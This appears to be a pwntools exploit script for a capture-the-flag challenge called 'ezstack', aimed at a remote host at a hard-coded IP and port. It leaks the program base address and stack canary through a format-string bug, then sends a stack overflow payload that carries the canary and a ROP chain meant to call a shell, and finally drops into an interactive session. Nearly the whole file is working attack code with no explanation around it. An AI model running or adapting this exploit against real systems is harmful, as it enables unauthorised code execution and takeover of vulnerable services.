# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('47.108.195.119', 20113)
# libc = ELF('./libc-2.31.so')
#io = process('./ezstack')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
sla('请输入你的队伍名称:','SN-天虞')
sla('请输入你的id或名字:','一梦不醒')
useless = 0xA8c
pop_rdi = 0x0000000000000b03
binsh = 0x00B24
sl('%17$p@%11$p')
process = int(ru('@')[-14:],16) - 0x9dc
print hex(process)
canary = int(rn(18),16)
print hex(canary)

pay = 'a'* 0x18 + p64(canary) + p64(0xdeadbeef)+ p64(process + pop_rdi) + p64(process + binsh) + p64(process + useless)
sla('--+--\n',pay)
irt()

